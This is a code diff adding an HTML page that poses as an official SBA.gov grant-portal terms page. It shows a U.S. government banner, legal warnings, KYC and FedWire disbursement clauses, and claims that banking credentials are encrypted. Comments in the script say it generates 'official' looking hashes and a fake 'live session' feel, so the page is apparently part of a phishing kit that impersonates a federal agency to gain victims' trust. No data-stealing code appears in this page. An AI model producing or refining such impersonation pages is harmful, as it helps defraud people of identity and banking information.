@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | 2026 Terms of Service</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .terms-content { font-size: 13px; color: #334155; line-height: 1.8; text-align: left; }
+        .terms-content h3 { font-size: 14px; color: #00274c; margin: 25px 0 10px 0; border-bottom: 2px solid #e2e8f0; display: inline-block; padding-bottom: 2px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 800; }
+        .clause-number { font-weight: 800; color: #0071bc; margin-right: 5px; }
+        .legal-stamp { border: 2px solid #ef4444; color: #ef4444; padding: 5px 12px; display: inline-block; transform: rotate(-3deg); font-weight: 900; font-size: 13px; margin-bottom: 15px; border-radius: 4px; opacity: 0.8; letter-spacing: 1px; }
+        .sig-box { margin-top: 30px; padding: 15px; background: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0; font-family: 'Courier New', monospace; font-size: 10px; color: #64748b; line-height: 1.4; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #00274c;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button class="logout-btn" onclick="history.back()" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
+            BACK
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 15px; border-top: 6px solid #ba0c2f; position: relative; overflow: hidden; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
+            
+            <div class="legal-stamp">CERTIFIED FY2026</div>
+
+            <h2 style="font-size: 24px; color: #00274c; margin-bottom: 5px; letter-spacing: -0.5px;">Terms & Conditions</h2>
+            <p style="font-size: 10px; color: #94a3b8; margin-bottom: 25px; font-weight: bold; text-transform: uppercase;">Revision: FY2026-V.4 | Federal Compliance Ledger</p>
+
+            <div class="terms-content">
+                <p style="background: #f1f5f9; padding: 15px; border-radius: 10px; border-left: 5px solid #0071bc; font-style: italic; font-size: 12px; margin-bottom: 20px; color: #1e293b; line-height: 1.6;">
+                    "By accessing this 2026 SBA portal, the applicant acknowledges that all provided data is subject to federal verification via the Department of Homeland Security (DHS) and the Internal Revenue Service (IRS)."
+                </p>
+
+                <h3><span class="clause-number">1.0</span> Authorization & Eligibility</h3>
+                <p>Access is strictly limited to verified U.S. residents and legal business entities. Users must undergo mandatory <b>Identity Authentication (KYC)</b> to qualify for fund disbursement. Unauthorized access attempt is a felony under the Computer Fraud and Abuse Act.</p>
+
+                <h3><span class="clause-number">2.0</span> Federal Fraud Statutes</h3>
+                <p><b>WARNING:</b> Intentional misrepresentation to obtain federal funds is a felony. Under <b>18 U.S.C. § 1001</b>, false statements are punishable by up to 5 years in federal prison and $250,000 in fines. System logs biometric and network metadata for fraud prevention.</p>
+
+                <h3><span class="clause-number">3.0</span> Disbursement & Wire Protocols</h3>
+                <p>Funds are released via the <b>Federal Reserve Bank (FedWire)</b>. Payouts are only permitted to domestic accounts matching the verified applicant's legal identity. Hold periods may apply for secondary Treasury compliance reviews.</p>
+
+                <h3><span class="clause-number">4.0</span> Data Sovereignty</h3>
+                <p>The SBA complies with the <b>Privacy Act of 1974</b>. Banking credentials and PII are encrypted using bank-grade 256-bit AES protocols. Data is used exclusively for 2026 grant allocation and disbursement verification.</p>
+            </div>
+
+            <div class="sig-box">
+                <b>DIGITAL SIGNATURE LOG:</b><br>
+                STATUS: AWAITING_CONSENT<br>
+                SESSION_TIME: <span id="legalTime"></span><br>
+                ENCRYPTION_ID: <span id="legalTrace"></span><br>
+                IP_RESOLVER: SECURE_TUNNEL_ACTIVE
+            </div>
+
+            <button onclick="history.back()" style="margin-top: 25px; background: #00274c; color: white; padding: 18px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px;">
+                I ACCEPT & AGREE TO TERMS
+            </button>
+        </div>
+
+        <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 25px; line-height: 1.4;">
+            Federal Small Business Administration | Office of General Counsel<br>
+            409 3rd St, SW, Washington, DC 20416
+        </p>
+    </div>
+
+    <script>
+        function updateLegalInfo() {
+            const now = new Date();
+            // Format time to look like a system log
+            const timeString = now.getFullYear() + "-" + 
+                               String(now.getMonth() + 1).padStart(2, '0') + "-" + 
+                               String(now.getDate()).padStart(2, '0') + " " + 
+                               now.toTimeString().split(' ')[0];
+            
+            document.getElementById('legalTime').innerText = timeString;
+            
+            // Generate a more "official" looking hash
+            const hash = "CERT-26-" + Math.random().toString(36).substring(2, 7).toUpperCase() + 
+                         "-" + Math.random().toString(36).substring(2, 7).toUpperCase();
+            document.getElementById('legalTrace').innerText = hash;
+        }
+        updateLegalInfo();
+        // Update every second to keep the "live session" feel
+        setInterval(updateLegalInfo, 1000);
+    </script>
+</body>
+</html>
